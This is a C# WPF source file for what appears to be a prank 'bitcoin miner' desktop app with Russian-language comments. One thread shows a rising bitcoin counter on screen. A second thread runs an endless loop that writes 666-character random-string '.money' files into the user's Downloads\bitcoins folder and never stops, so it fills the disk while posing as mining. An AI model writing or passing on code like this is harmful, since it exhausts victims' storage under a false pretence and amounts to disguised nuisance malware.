using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;


namespace shizaa
{
    delegate void UpdateProgressBarDelegate(DependencyProperty dp, object value);
    public partial class MainWindow : Window
    {
        int s;

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwyz";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void ColorSlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            s = (int)slider.Value;
        }

        public MainWindow()
        {
            InitializeComponent();
            


            new Thread(async () =>
            {
                ulong da = 0;
                while (true)
                {
                    da++;
                    Dispatcher.Invoke(() =>
                    {
                        pisya.Text = $"{da} биткойнов";
                    });
                    await Task.Delay(s);
                }
            }).Start();

            new Thread(() =>
            {
                DirectoryInfo dir = new DirectoryInfo(System.Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile) + "\\Downloads\\bitcoins");
                if (!dir.Exists) Directory.CreateDirectory(dir.FullName);
                ulong dada = 0;
                
                while (true)
                {
                    
                    StreamWriter file = new StreamWriter(System.Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile) + $"\\Downloads\\bitcoins\\{dada}.money");
                    file.Write(RandomString(666));//будем пытаться майнить на шпиндел
                    file.Close();
                    dada++;
                    
                }

            }).Start();


        }


        
    }
}
